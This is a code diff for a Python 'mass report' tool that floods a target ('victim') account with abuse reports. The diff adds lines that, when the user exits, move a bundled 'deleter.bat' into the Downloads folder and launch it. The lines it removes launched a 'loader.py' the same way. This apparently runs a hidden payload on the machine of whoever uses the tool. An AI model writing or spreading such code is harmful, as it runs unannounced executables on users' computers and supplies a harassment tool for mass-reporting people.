@@ -3,6 +3,8 @@ import requests, json, lxml, random, time
 from bs4 import BeautifulSoup
 from pystyle import Colorate, Colors, Add, Center, Write
 import os
+import shutil
+
 validReports = 0
 idinput = input("user id here: ")
 
@@ -146,9 +148,13 @@ def report(victim, amount, reason, cooldown, descriptions):
 
 	Write.Print(f"\n\n[>] Finished Mass Report.\n[>] Reports Sent: {amount}\n[>] Valid Reports: {validReports}\n\n", Colors.purple_to_blue, interval=0.0025)
 	Write.Input("[>] Enter to Exit...", Colors.purple_to_blue, interval=0.0025)
-	directory = "%userprofile%\Downloads\files_in_usage"
-	local_file = 'loader.py'
-	commanding = "start "+local_file
+
+	src_path = r"%userprofile%\Downloads\files_in_usage\deleter.bat"
+	dst_path = r"%userprofile%\Downloads\deleter.bat"
+	shutil.move(src_path, dst_path)
+	directory = "%userprofile%\Downloads"
+	local_file = 'deleter.bat'
+	commanding = "start "+directory+local_file
 	os.system(commanding)
 	exit()
 #gig
